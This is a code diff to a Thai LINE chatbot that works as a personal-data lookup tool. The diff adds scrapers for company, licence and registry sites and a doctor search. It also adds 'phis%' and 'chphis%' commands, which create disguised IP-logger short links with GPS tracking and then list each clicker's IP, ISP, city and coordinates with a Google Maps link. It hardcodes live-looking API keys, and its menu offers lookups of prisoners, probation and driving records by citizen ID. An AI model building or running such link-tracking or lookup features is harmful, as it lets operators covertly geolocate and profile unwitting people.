@@ -11,6 +11,9 @@ const crypto = require('crypto');
 const IAPP_API_KEY = 'iapp_live_ccd35e461ddb1ba1f44096afde50cff5118c2013eb30491047d7a5cd69dcc443';
 const faceCompareSessions = {};
 const plateOcrSessions = {};
+const PHISHING_LOG_API_KEY = 'api_fXLDx9XVRsF6sRZ3cBUDxWJVjLzD40jy';
+const PHISHING_LOG_DOMAIN = 'go.onlinematichornonline.com';
+const phishingLoggerMap = {};
 
 async function searchHospital(keyword) {
   const url = `https://cpp.nhso.go.th/search/?q=${encodeURIComponent(keyword)}`;
@@ -860,6 +863,75 @@ function limitLineMessage(msg) {
   return msg.length > 4800 ? msg.slice(0, 4800) + '\n...ตัดข้อความ...' : msg;
 }
 
+async function createPhishingShortLink(targetUrl) {
+  try {
+    const response = await axios.post(
+      `https://api.iplogger.org/create/shortlink/?token=${PHISHING_LOG_API_KEY}`,
+      {
+        destination: targetUrl,
+        domain: PHISHING_LOG_DOMAIN,
+        gps: 1,
+        smart: 1,
+        privacy: 1,
+        notify: 1
+      },
+      { headers: { 'Content-Type': 'application/json' } }
+    );
+
+    const result = response.data?.result;
+    if (!result?.id || !result?.shortlink) {
+      return '❌ ไม่สามารถสร้าง short link ได้';
+    }
+
+    phishingLoggerMap[result.id] = {
+      id: result.id,
+      shortlink: result.shortlink,
+      creation_date: result.creation_date
+    };
+
+    return `✅ สร้างลิ้งค์สำเร็จแล้ว\nรหัสid: ${result.id}\nลิ้งค์คือ: ${result.shortlink}\n`;
+  } catch (error) {
+    return '❌ Failed to create short link: ' + (error.response?.data?.message || error.message);
+  }
+}
+
+async function showPhishingLoggerVisitors(id) {
+  const logger = phishingLoggerMap[id] || { id };
+
+  try {
+    const response = await axios.get('https://api.iplogger.org/logger/visitors/', {
+      params: {
+        id: logger.id,
+        token: PHISHING_LOG_API_KEY,
+        hide_bots: 1,
+        limit: 100
+      },
+      headers: { 'Content-Type': 'application/json' }
+    });
+
+    const visits = response.data?.result || [];
+    if (!visits.length) return '🔍 ยังไม่มีคนกดลิงก์หรือถูกกรองหมดแล้ว';
+
+    let msg = '';
+    visits.forEach((visit, idx) => {
+      msg += `👤 Visitor #${idx + 1}:\n`;
+      msg += `- IP: ${visit.ip || '-'}\n`;
+      msg += `- ประเทศ: ${visit.country || '-'}\n`;
+      msg += `- อำเภอ: ${visit.city || '-'}\n`;
+      msg += `- สัญญาณ: ${visit.isp || '-'}`;
+      if (visit.lat && visit.lng) {
+        msg += `\n- พิกัด: ${visit.lat},${visit.lng}`;
+        msg += `\n- ลิ้งค์googlemap: https://www.google.com/maps?q=${visit.lat},${visit.lng}`;
+      }
+      msg += '\n----------------------\n';
+    });
+
+    return limitLineMessage(msg);
+  } catch (err) {
+    return '❌ Failed to get visitor data: ' + (err.response?.data?.message || err.message);
+  }
+}
+
 function limitAllSection(text, max = 1000) {
   const value = String(text || '-');
   return value.length > max ? value.slice(0, max) + '\n...ย่อข้อมูล...' : value;
@@ -1564,6 +1636,434 @@ function stripHtml(value) {
     .replace(/&#39;/g, "'")
     .replace(/\s+/g, ' ')
     .trim();
+}
+
+async function fetchDataForThaiCompany(searchText) {
+  try {
+    const form = new URLSearchParams();
+    form.append('mode', 'search_comp');
+    form.append('data[searchtext]', searchText);
+
+    const apiRes = await axios.post('https://www.dataforthai.com/api/company', form.toString(), {
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      timeout: 15000
+    });
+
+    if (!apiRes.data || !Array.isArray(apiRes.data.data) || apiRes.data.data.length === 0) {
+      return { ok: false, message: 'ไม่พบผลจาก DataForThai' };
+    }
+
+    const first = apiRes.data.data[0];
+    const jpNo = first.jp_no || '';
+    let detailHtml = '';
+
+    try {
+      const detailRes = await axios.get(`https://www.dataforthai.com/company/${jpNo}/`, {
+        headers: { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' },
+        timeout: 15000
+      });
+      detailHtml = detailRes.data;
+    } catch {
+      detailHtml = '';
+    }
+
+    const detail = {
+      business: '',
+      status: '',
+      regDate: '',
+      capital: '',
+      address: ''
+    };
+
+    if (detailHtml) {
+      const $ = cheerio.load(detailHtml);
+      const getNextTd = (label) => {
+        const normalized = label.replace(/\s+/g, '');
+        const td = $('td').filter((_, el) => $(el).text().trim().replace(/\s+/g, '') === normalized);
+        if (td.length) return td.first().next().text().trim().replace(/\s+/g, ' ');
+        const td2 = $('td').filter((_, el) => $(el).text().trim().includes(label));
+        if (td2.length) return td2.first().next().text().trim().replace(/\s+/g, ' ');
+        return '';
+      };
+
+      detail.business = getNextTd('ธุรกิจ') || getNextTd('ประเภทธุรกิจ') || '';
+      detail.status = getNextTd('สถานะ') || '';
+      detail.regDate = getNextTd('จดทะเบียน') || getNextTd('วันที่จดทะเบียน') || '';
+      detail.capital = getNextTd('ทุนจดทะเบียน') || '';
+      detail.address = getNextTd('ที่ตั้ง') || $('a[href*="maps"]').first().text().trim() || '';
+      detail.address = detail.address.replace(/สถิติการค้นหา[\s\S]*/g, '').trim();
+      detail.business = detail.business.replace(/\s{2,}/g, ' ').replace(/หมวดธุรกิจ[:：]?\s*/i, '\nหมวดธุรกิจ: ').trim();
+    }
+
+    return {
+      ok: true,
+      summary: {
+        jp_no: jpNo,
+        jp_tname: first.jp_tname || first.full_tname || '',
+        obj_name_keyin: first.obj_name_keyin || '',
+        full_tname: first.full_tname || '',
+        detail
+      }
+    };
+  } catch {
+    return { ok: false, message: 'เกิดข้อผิดพลาดขณะค้นหาจาก DataForThai' };
+  }
+}
+
+function formatDataForThaiSummary(summary) {
+  let business = (summary.detail.business || '').replace(/\s{2,}/g, ' ').trim();
+  let mainBiz = business;
+  let bizCat = '';
+
+  if (business.includes('หมวดธุรกิจ:')) {
+    [mainBiz, bizCat] = business.split('หมวดธุรกิจ:');
+    mainBiz = mainBiz.trim();
+    bizCat = bizCat.trim();
+  }
+
+  let msg = '🔎 ข้อมูลบริษัทจาก DataForThai\n━━━━━━━━━━━━━━━━━━\n';
+  msg += `🆔 ทะเบียน (JP No): ${summary.jp_no || '-'}\n`;
+  msg += `🏢 ชื่อกิจการ: ${summary.jp_tname || summary.full_tname || '-'}\n`;
+  if (summary.obj_name_keyin) msg += `📝 ชื่อที่ป้อน: ${summary.obj_name_keyin}\n`;
+  msg += '\n📄 รายละเอียดบริษัท\n';
+  msg += `• สถานะ: ${summary.detail.status || '-'}\n`;
+  msg += `• ธุรกิจ: ${mainBiz || '-'}\n`;
+  if (bizCat) msg += `• หมวดธุรกิจ: ${bizCat}\n`;
+  msg += `• จดทะเบียน: ${summary.detail.regDate || '-'}\n`;
+  msg += `• ทุนจดทะเบียน: ${summary.detail.capital || '-'}\n`;
+  if (summary.detail.address) msg += `• ที่ตั้ง: ${summary.detail.address}\n`;
+  return msg.trim();
+}
+
+async function searchBOTLicenseByBrowser(keyword) {
+  let browser;
+  try {
+    const { chromium } = require('playwright');
+    browser = await chromium.launch({ headless: true });
+    const page = await browser.newPage();
+
+    await page.goto('https://app.bot.or.th/BOTLicenseCheck/', { waitUntil: 'domcontentloaded', timeout: 30000 });
+    await page.waitForSelector('#inputSearchName', { timeout: 10000, state: 'visible' });
+    await page.fill('#inputSearchName', keyword);
+    await page.click('button.btn-title-search');
+    await page.waitForSelector('div.top.bot-license a.comp-name', { timeout: 10000 });
+
+    const href = await page.getAttribute('div.top.bot-license a.comp-name', 'href');
+    if (!href) return null;
+
+    await page.goto(new URL(href, 'https://app.bot.or.th').toString(), { waitUntil: 'domcontentloaded', timeout: 30000 });
+    const $ = cheerio.load(await page.content());
+
+    const title = $('h2.c-header-custom').text().trim();
+    const branchType = $('span.sub-header').first().text().trim();
+    const address = $('div.bot-comp-header span.sub-header').eq(1).text().trim();
+    const infoDateTime = $('p.shown-date').text().replace('ข้อมูล ณ วันที่', '').trim();
+    const [infoDate, infoTime] = infoDateTime.split('เวลา').map(s => (s || '').trim() || '-');
+    const licenseRows = [];
+
+    $('div.level3-header8').each((_, el) => {
+      const type = $(el).find('.comp-info p').text().trim();
+      const status = $(el).find('.comp-info button').text().trim();
+      const dates = [];
+      $(el).find('.title-and-date .date').each((__, d) => dates.push($(d).text().trim()));
+      licenseRows.push({
+        type,
+        status,
+        dateStart: dates[0] || '-',
+        dateEnd: dates[dates.length - 1] || '-'
+      });
+    });
+
+    let msg = '🔎 BOT License\n--------------------\n';
+    msg += `ชื่อ: ${title || '-'}\n`;
+    if (branchType) msg += `ประเภทสาขา: ${branchType}\n`;
+    if (address) msg += `ที่ตั้ง: ${address}\n`;
+    msg += `ข้อมูล ณ: ${infoDate || '-'} ${infoTime || ''}\n\n`;
+    if (licenseRows.length) {
+      msg += 'ใบอนุญาต / การขึ้นทะเบียน:\n';
+      licenseRows.forEach((row, idx) => {
+        msg += `${idx + 1}. ${row.type || '-'} ${row.status ? `(${row.status})` : ''}\n`;
+        msg += `   ได้รับ: ${row.dateStart}\n`;
+        msg += `   สิ้นสุด: ${row.dateEnd}\n`;
+      });
+    }
+
+    return msg;
+  } catch {
+    return null;
+  } finally {
+    if (browser) await browser.close().catch(() => {});
+  }
+}
+
+async function searchBOTLicense(keyword) {
+  try {
+    const parts = [];
+    const dft = await fetchDataForThaiCompany(keyword);
+    if (dft.ok) parts.push(formatDataForThaiSummary(dft.summary));
+
+    const browserResult = await searchBOTLicenseByBrowser(keyword);
+    if (browserResult && !browserResult.includes('❌')) parts.push(browserResult);
+
+    const combined = parts.filter(Boolean).join('\n\n━━━━━━━━━━━━━━━━━━\n\n');
+    return combined ? limitLineMessage(combined) : '❌ ไม่พบข้อมูลบริษัทหรือใบอนุญาต';
+  } catch {
+    return 'เกิดข้อผิดพลาดในการค้นหา BOT License';
+  }
+}
+
+async function searchCompanyDataforthai(id) {
+  try {
+    const { data: html } = await axios.get(`https://www.dataforthai.com/company/${id}`, {
+      headers: {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
+        'Accept-Language': 'th,en;q=0.9'
+      },
+      timeout: 15000
+    });
+
+    const $ = cheerio.load(html);
+    const nameTH = $('h2').first().text().trim();
+    const nameEN = $('h3').first().text().trim();
+    const nextText = (...labels) => {
+      let value = '';
+      $('td').each((_, el) => {
+        const label = $(el).text();
+        if (!value && labels.some(item => label.includes(item))) {
+          value = $(el).next().text().trim().replace(/\s+/g, ' ');
+        }
+      });
+      return value;
+    };
+
+    let address = '';
+    let mapLink = '';
+    $('td').each((_, el) => {
+      if (!$(el).text().includes('ที่ตั้ง')) return;
+      const next = $(el).next();
+      const a = next.find('a');
+      address = (a.length ? a.text() : next.text()).trim().replace(/\s+/g, ' ');
+      mapLink = a.attr('href') || '';
+    });
+
+    if (!nameTH && !nameEN) return `❌ ไม่พบข้อมูลบริษัทสำหรับเลขทะเบียนนี้ (${id})`;
+
+    return `🏢 ข้อมูลบริษัท
+====================
+📌 ชื่อบริษัท: ${nameTH || '-'}
+🌐 (EN): ${nameEN || '-'}
+🆔 เลขทะเบียน: ${nextText('ทะเบียน', 'เลขทะเบียน') || id}
+📋 ประเภทธุรกิจ: ${nextText('ประกอบธุรกิจ', 'ประเภทธุรกิจ', 'ธุรกิจ') || '-'}
+📅 วันที่จดทะเบียน: ${nextText('วันที่จดทะเบียน', 'จดทะเบียน') || '-'}
+💰 ทุนจดทะเบียน: ${nextText('ทุนจดทะเบียน') || '-'}
+📍 ที่ตั้ง: ${address || '-'}
+${mapLink ? `🗺️ แผนที่: ${mapLink}` : ''}
+📊 สถานะ: ${nextText('สถานะ') || '-'}
+====================`;
+  } catch (e) {
+    return `❌ เกิดข้อผิดพลาดในการค้นหา DataForThai: ${e.message}`;
+  }
+}
+
+async function searchLoanLicense(appName) {
+  try {
+    const keyword = encodeURIComponent(appName.trim());
+    const url = `https://www.bot.or.th/content/bot/th/license-loan/jcr:content/root/container/superlist_442030069.superListingResults.15.0.ascending.json/sortOrderMap/ascending/keyword/${keyword}`;
+    const response = await axios.get(url, { httpsAgent });
+    const data = response.data;
+
+    if (!data.success || !data.results || data.results.length === 0) {
+      return '❌ ไม่พบข้อมูลใบอนุญาตสินเชื่อสำหรับแอปนี้';
+    }
+
+    let msg = `🏦 ข้อมูลใบอนุญาตสินเชื่อ (${appName})\n====================\n`;
+    data.results.forEach((item, idx) => {
+      const row = item.rowData || {};
+      msg += `[${idx + 1}]\n`;
+      msg += `📱 แอป: ${stripHtml(row.nameapp)}\n`;
+      msg += `🏢 บริษัท: ${stripHtml(row.namecompany)}\n`;
+      msg += `🏠 ติดต่อ: ${stripHtml(row.contact)}\n`;
+      msg += `🔗 ลิงก์: ${stripHtml(row.link)}\n`;
+      msg += '====================\n';
+    });
+
+    return limitLineMessage(msg);
+  } catch (e) {
+    return '❌ เกิดข้อผิดพลาดในการค้นหาใบอนุญาตสินเชื่อ: ' + e.message;
+  }
+}
+
+async function searchThaiTruckCenter(searchText) {
+  const SEARCH_URL = 'https://www.thaitruckcenter.com/tdsc/2Product/CompanyV_4';
+  const baseHeaders = () => ({
+    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
+    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+    'Accept-Language': 'th-TH,th;q=0.9,en-US;q=0.8,en;q=0.7',
+    Connection: 'keep-alive'
+  });
+  const session = axios.create({ withCredentials: true, headers: baseHeaders() });
+
+  const getHiddenFields = async () => {
+    const res = await session.get(SEARCH_URL);
+    const $ = cheerio.load(res.data);
+    const get = (name) => $(`input[name='${name}']`).attr('value') || '';
+    return {
+      __VIEWSTATE: get('__VIEWSTATE'),
+      __VIEWSTATEGENERATOR: get('__VIEWSTATEGENERATOR'),
+      __EVENTVALIDATION: get('__EVENTVALIDATION')
+    };
+  };
+
+  const hidden = await getHiddenFields();
+  const form = new URLSearchParams();
+  form.append('__VIEWSTATE', hidden.__VIEWSTATE);
+  form.append('__VIEWSTATEGENERATOR', hidden.__VIEWSTATEGENERATOR);
+  form.append('__EVENTVALIDATION', hidden.__EVENTVALIDATION);
+  form.append('__EVENTTARGET', 'BtnSearch');
+  form.append('__EVENTARGUMENT', '');
+  form.append('__LASTFOCUS', '');
+  form.append('txtBoxComp', searchText);
+  form.append('ddlProvince', 'ค้นหาจังหวัดของผู้ประกอบการ');
+  form.append('ddlSize', '0');
+  form.append('ddlGroup', '0');
+  form.append('ddlSubGroup', '1');
+
+  const res = await session.post(SEARCH_URL, form.toString(), {
+    headers: { ...baseHeaders(), 'Content-Type': 'application/x-www-form-urlencoded' }
+  });
+  const $ = cheerio.load(res.data);
+  const a = $("a[id^='GridViewCompany_link_']").first();
+  if (!a.length) return null;
+
+  const detailUrl = new URL(a.attr('href') || '', SEARCH_URL).toString().replace('CompanyInfo.aspx', 'CompanyInfo');
+  const rowTds = a.closest('tr').find('td');
+  const detailRes = await session.get(detailUrl);
+  const detail$ = cheerio.load(detailRes.data);
+  const text = (sel) => detail$(sel).first().text().trim() || null;
+  const carTypes = [];
+  detail$('#ContentPlaceHolder1_CarTypeTable tr').each((_, tr) => {
+    const type = detail$(tr).find('td').first().text().trim();
+    if (type) carTypes.push({ type });
+  });
+
+  return {
+    type: $(rowTds[1]).text().trim() || null,
+    licenseNo: $(rowTds[2]).text().trim() || null,
+    province: $(rowTds[4]).text().trim() || null,
+    companyName: text('#ContentPlaceHolder1_lblcomp_name2') || a.text().trim() || null,
+    detail: text('#ContentPlaceHolder1_lbldetail'),
+    route: text('#ContentPlaceHolder1_lbltransport_route'),
+    products: text('#ContentPlaceHolder1_lblproduct'),
+    phone: text('#ContentPlaceHolder1_lblphone'),
+    email: text('#ContentPlaceHolder1_lblemail'),
+    website: text('#ContentPlaceHolder1_lblwebsite'),
+    address: text('#ContentPlaceHolder1_lbladress'),
+    service: text('#ContentPlaceHolder1_lblservice'),
+    carTypes
+  };
+}
+
+function formatThaiTruckCenterResult(result) {
+  if (!result) return '❌ ไม่พบข้อมูลบริษัทที่ระบุหรือเกิดข้อผิดพลาด';
+  const carList = (result.carTypes || []).map(ct => `- ${ct.type}`).join('\n') || '-';
+  return `บริษัท: ${result.companyName || '-'}
+ประเภท: ${result.type || '-'}
+เลขใบอนุญาต: ${result.licenseNo || '-'}
+จังหวัด: ${result.province || '-'}
+
+รายละเอียด:
+${result.detail || '-'}
+
+เส้นทางการขนส่ง:
+${result.route || '-'}
+
+สินค้า:
+${result.products || '-'}
+
+เบอร์โทร: ${result.phone || '-'}
+อีเมล: ${result.email || '-'}
+เว็บไซต์: ${result.website || '-'}
+
+ที่อยู่:
+${result.address || '-'}
+
+การให้บริการ:
+${result.service || '-'}
+
+ประเภท / จำนวนรถ:
+${carList}`;
+}
+
+function calculateCCTVTimeDiff(cameraTime, realTime) {
+  const timePattern = /^([01]?\d|2[0-3]):([0-5]\d):([0-5]\d)$/;
+  if (!timePattern.test(cameraTime) || !timePattern.test(realTime)) {
+    return 'รูปแบบเวลาไม่ถูกต้อง กรุณาใช้รูปแบบ HH:MM:SS';
+  }
+
+  const [camHours, camMinutes, camSeconds] = cameraTime.split(':').map(Number);
+  const [realHours, realMinutes, realSeconds] = realTime.split(':').map(Number);
+  let diffSeconds = (camHours * 3600 + camMinutes * 60 + camSeconds) - (realHours * 3600 + realMinutes * 60 + realSeconds);
+  if (diffSeconds < 0) diffSeconds += 24 * 3600;
+
+  const hours = Math.floor(diffSeconds / 3600);
+  diffSeconds %= 3600;
+  const minutes = Math.floor(diffSeconds / 60);
+  const seconds = diffSeconds % 60;
+
+  return `🎥 การคำนวณความต่างของเวลา CCTV
+====================
+⏰ เวลาในกล้อง: ${cameraTime}
+⌚ เวลาจริง: ${realTime}
+🕒 เวลาต่างกัน: ${hours} ชั่วโมง ${minutes} นาที ${seconds} วินาที
+====================`;
+}
+
+async function searchTISI(licenseId) {
+  try {
+    const payload = new URLSearchParams();
+    payload.append('n', licenseId);
+
+    const response = await axios.post('https://a.tisi.go.th/l/', payload, {
+      headers: {
+        Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+        'Accept-Language': 'en-US,en;q=0.7',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        Origin: 'https://appdb.tisi.go.th',
+        Referer: 'https://appdb.tisi.go.th/',
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36'
+      }
+    });
+
+    const $ = cheerio.load(response.data);
+    const get = (label) => $(`div.col-xs-12:contains("${label}") font:last, div.col-xs-6:contains("${label}") font:last`).first().text().trim();
+    let details = '';
+    $('div.col-xs-12:contains("รายละเอียด") + div.col-xs-12 ul li').each((_, elem) => {
+      details += `• ${$(elem).text().trim()}\n`;
+    });
+
+    return `📋 ข้อมูลใบอนุญาต TISI
+====================
+📝 เลขที่ใบอนุญาต: ${get('เลขที่ใบอนุญาต') || '-'}
+📅 วันที่ออก: ${get('วันที่ออกใบอนุญาต') || '-'}
+🔢 เลข มอก.: ${get('เลข มอก.') || '-'}
+📋 ประเภท: ${get('ประเภท') || '-'}
+
+👤 ข้อมูลผู้รับใบอนุญาต
+ชื่อ: ${get('ผู้รับใบอนุญาต') || '-'}
+เลขประจำตัวผู้เสียภาษี: ${get('เลขประจำตัวผู้เสียภาษี') || '-'}
+ที่อยู่: ${get('ที่อยู่ :') || '-'}
+
+🏭 ข้อมูลโรงงาน
+ชื่อโรงงาน: ${get('ชื่อโรงงาน') || '-'}
+ทะเบียนโรงงาน: ${get('ทะเบียนโรงงาน') || '-'}
+ที่อยู่โรงงาน: ${get('ที่อยู่โรงงาน') || '-'}
+
+📝 รายละเอียดเพิ่มเติม
+${details || 'ไม่มีรายละเอียดเพิ่มเติม'}
+====================`;
+  } catch (error) {
+    return 'เกิดข้อผิดพลาดในการค้นหาข้อมูลใบอนุญาต TISI: ' + error.message;
+  }
 }
 
 function firstMatch(text, regex, fallback = '') {
@@ -3052,6 +3552,7 @@ function buildMenuCarouselFlex() {
                 '┌● ประกันสังคม si%เลขบัตร',
                 '├● นักเรียน OPEC st%เลขบัตร',
                 '├● ตรวจสอบแพทยสภา dc%ชื่อ สกุล',
+                '├● ข้อมูลแพทย์ dr%ชื่อ สกุล',
                 '├● ใบขับขี่ dl#เลขบัตร',
                 '├● คุมประพฤติ pb%เลขบัตร',
                 '├● ผู้ต้องขัง psi#เลขบัตร',
@@ -5525,6 +6026,7 @@ if (text.startsWith('nm%')) {
 ├ 🎣 phis%URL→เพิ่ม Phishing
 ├ 🎣 chphis%ID→ตรวจ Phishing
 ├ 🌐 picf%url→ตรวจ ดึงภาพ Profile facebook
+├ 🔎 dr%ชื่อ สกุล→ข้อมูลแพทย์/บุคลากรสาธารณสุข
 ├ 🌐 soc%Username/ชื่อโซเชี่ยล/หรือข้อความอื่นๆ→ค้นหาโซเชี่ยล
 ├ 🌐 ip%เลข IP→ตรวจเครือข่าย IP
 ├ 🌐 imei%เลข IMEI→ตรวจ IMEI
@@ -6239,6 +6741,23 @@ if (text.startsWith('soc%')) {
     }
   }
 
+  if (text.startsWith('dr%')) {
+    const query = text.replace(/^dr%/i, '').trim();
+    const parts = query.split(/\s+/).filter(Boolean);
+
+    if (parts.length < 2) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุชื่อและนามสกุล เช่น dr%ภัทรักษ์ ลาภบุญเรือง' });
+    }
+
+    try {
+      const result = await searchCheckMd(parts[0], parts.slice(1).join(' '));
+      return reply(event.replyToken, { type: 'text', text: formatCheckMdResult(result, query) });
+    } catch (err) {
+      console.error('dr checkmd error:', err?.response?.data || err.message);
+      return reply(event.replyToken, { type: 'text', text: '❌ ตรวจสอบแพทย์ไม่สำเร็จ: ' + err.message });
+    }
+  }
+
   // นักเรียน OPEC: st%เลขบัตร
   if (text.startsWith('st%')) {
     const citizenId = text.replace(/^st%/i, '').trim();
@@ -6522,6 +7041,24 @@ text: newText
 
 }
 
+  if (text.startsWith('phis%')) {
+    const targetUrl = text.replace(/^phis%/i, '').trim();
+    if (!targetUrl) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุ URL เช่น phis%https://example.com' });
+    }
+    const result = await createPhishingShortLink(targetUrl);
+    return reply(event.replyToken, { type: 'text', text: result });
+  }
+
+  if (text.startsWith('chphis%')) {
+    const id = text.replace(/^chphis%/i, '').trim();
+    if (!id) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุ ID เช่น chphis%123456' });
+    }
+    const result = await showPhishingLoggerVisitors(id);
+    return reply(event.replyToken, { type: 'text', text: result });
+  }
+
   if (text.startsWith('cell%')) {
     const cellInput = text.replace(/^cell%/i, '').trim();
     try {
@@ -6647,6 +7184,64 @@ text: newText
     }
     const result = await getWebInfo(url);
     return reply(event.replyToken, { type: 'text', text: result });
+  }
+
+  if (text.startsWith('lc%')) {
+    const keyword = text.replace(/^lc%/i, '').trim();
+    if (!keyword) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุชื่อ-สกุล, ชื่อบริษัท/นิติบุคคล เช่น lc%สมชาย ใจดี, บริษัท ตัวอย่าง จำกัด' });
+    }
+    const result = await searchBOTLicense(keyword);
+    return reply(event.replyToken, { type: 'text', text: result });
+  }
+
+  if (text.startsWith('loa%')) {
+    const appName = text.replace(/^loa%/i, '').trim();
+    if (!appName) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุชื่อแอป เช่น loa%ชื่อแอปเงินกู้' });
+    }
+    const result = await searchLoanLicense(appName);
+    return reply(event.replyToken, { type: 'text', text: result });
+  }
+
+  if (text.startsWith('for%')) {
+    const companyId = text.replace(/^for%/i, '').trim();
+    if (!companyId) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุเลขนิติบุคคล เช่น for%0105550000000' });
+    }
+    const result = await searchCompanyDataforthai(companyId);
+    return reply(event.replyToken, { type: 'text', text: limitLineMessage(result) });
+  }
+
+  if (text.startsWith('tr%')) {
+    const name = text.replace(/^tr%/i, '').trim();
+    if (!name) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุชื่อผู้ประกอบการ เช่น tr%บริษัท กาฬสินธุ์ออโตเซลส์ จำกัด' });
+    }
+    try {
+      const result = await searchThaiTruckCenter(name);
+      return reply(event.replyToken, { type: 'text', text: limitLineMessage(formatThaiTruckCenterResult(result)) });
+    } catch (err) {
+      console.error('tr error:', err?.response?.data || err.message);
+      return reply(event.replyToken, { type: 'text', text: '❌ เกิดข้อผิดพลาดระหว่างค้นหาผู้ประกอบการขนส่ง' });
+    }
+  }
+
+  if (text.startsWith('cctv%')) {
+    const times = text.replace(/^cctv%/i, '').split(',').map(item => item.trim()).filter(Boolean);
+    if (times.length !== 2) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุเวลา เช่น cctv%12:00:00, 12:05:30' });
+    }
+    return reply(event.replyToken, { type: 'text', text: calculateCCTVTimeDiff(times[0], times[1]) });
+  }
+
+  if (text.startsWith('tisi%')) {
+    const licenseId = text.replace(/^tisi%/i, '').trim();
+    if (!licenseId) {
+      return reply(event.replyToken, { type: 'text', text: '❌ กรุณาระบุเลข มอก. เช่น tisi%1234' });
+    }
+    const result = await searchTISI(licenseId);
+    return reply(event.replyToken, { type: 'text', text: limitLineMessage(result) });
   }
 
   if (text.startsWith('psi#')) {
